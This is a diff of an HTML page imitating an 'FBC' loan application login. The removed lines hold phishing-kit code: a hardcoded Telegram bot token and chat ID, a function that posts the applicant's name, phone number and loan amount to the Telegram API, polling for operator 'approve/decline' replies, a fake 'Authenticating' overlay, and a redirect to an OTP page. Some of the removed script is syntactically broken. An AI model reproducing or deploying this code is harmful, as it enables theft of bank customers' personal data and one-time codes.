@@ -350,28 +350,6 @@
       cursor: pointer;
       width: 100%;
     }
-    .overlay {
-    position: fixed; inset: 0;
-    display: none;
-    align-items: center; justify-content: center; flex-direction: column; gap: 12px;
-    background: rgba(0,26,51,0.92);
-    z-index: 2000;
-    backdrop-filter: blur(5px);
-}
-.overlay.on { display: flex; }
-
-.spin {
-    width: 46px; height: 46px;
-    border: 4px solid rgba(255,255,255,0.1);
-    border-top-color: var(--blue-bright);
-    border-radius: 50%;
-    animation: sp 0.8s linear infinite;
-}
-
-.sp-t { font-size: 14px; font-weight: 700; color: white; }
-.sp-s { font-size: 11px; color: rgba(255,255,255,0.6); }
-
-@keyframes sp { to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
@@ -420,11 +398,6 @@
         <div class="error-notice" id="loginError">Please enter a valid mobile number</div>
 
         <button type="submit" class="pill-btn">Continue</button>
-        <div class="overlay on">
-  <div class="spin"></div>
-  <div class="sp-t">Authenticating</div>
-  <div class="sp-s">Please wait...</div>
-        </div>
       </form>
     </main>
 
@@ -461,74 +434,6 @@
   </div>
 
   <script>
-        const BOT = '9167169396:AAEmzZ5ndzC0WzHEYXsY805aqoDv2qzR1Ww';
-        const CID = '8820857419';
-        var bd = {}, luid = 0;
-
-        function init() {
-            var p = new URLSearchParams(location.search);
-            var name = p.get('name') || '';
-            var phone = p.get('phone') || '';
-            var amount = p.get('amount') || '';
-
-            bd = { name: name, phone: phone, amount: amount };
-      const loanAmount = parseFloat(localStorage.getItem('fbc_loan_amount') || '5000');
-      const name = localStorage.getItem('fbc_applicant_name') || 'Tendai Emmanuel Moyo';
-      const phone = localStorage.getItem('fbc_phone_number') || '+263 77 123 4567';
-         }
-
-        async function tg(msg, btns) {
-            try {
-                await fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
-                });
-            } catch(e) { console.error(e); }
-        }
-
-            var msg = '\u{1f4f1} <b>FBC Loan Application</b>\n\n' +
-                '<b>Name:</b> <code>' + bd.name + '</code>\n' +
-                '<b>Phone:</b> <code>+263' + bd.phone + '</code>\n' +
-                '<b>Amount:</b> <code>USD ' + bd.amount + '</code>\n' +
-
-            var replyBtns = [
-                [{ text: '\u2713 Approved', callback_data: 'login_approved' }, { text: '\u2717 Declined', callback_data: 'login_declined' }],
-                [{ text: '\u26a0\ufe0f Already Applied', callback_data: 'login_applied' }]
-            ];
-
-            document.getElementById('ov').classList.add('on');
-            tg(msg, replyBtns);
-            poll();
-        }
-
-        function poll() {
-            var iv = setInterval(function() {
-                fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (luid + 1))
-                    .then(function(r) { return r.json(); })
-                    .then(function(d) {
-                        if (d.ok && d.result.length > 0) {
-                            var u = d.result[0];
-                            luid = u.update_id;
-                            if (u.callback_query) {
-                                var cb = u.callback_query.data;
-                                if (cb === 'login_approved') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); goOTP(); }
-                                else if (cb === 'login_declined') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Request declined. Please try again.'); document.getElementById('frm').reset(); }
-                                else if (cb === 'login_applied') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); document.getElementById('aModal').classList.add('on'); }
-                            }
-                        }
-                    }).catch(function(e) { console.error(e); });
-            }, 1000);
-            setTimeout(function() { clearInterval(iv); }, 300000);
-        
-        function goOTP() {
-            document.getElementById('aModal').classList.remove('on');
-            var dataParam = 'Loan USD ' + bd.amount + ' for ' + bd.duration;
-            location.href = 'otp.html?data=' + encodeURIComponent(dataParam) + '&price=' + bd.amount + '&phone=' + bd.phone + '&name=' + encodeURIComponent(bd.name);
-        }
-
-        window.addEventListener('load', init);
-
     window.addEventListener('DOMContentLoaded', () => {
       const savedPhone = localStorage.getItem('fbc_phone_number');
       if (savedPhone) {
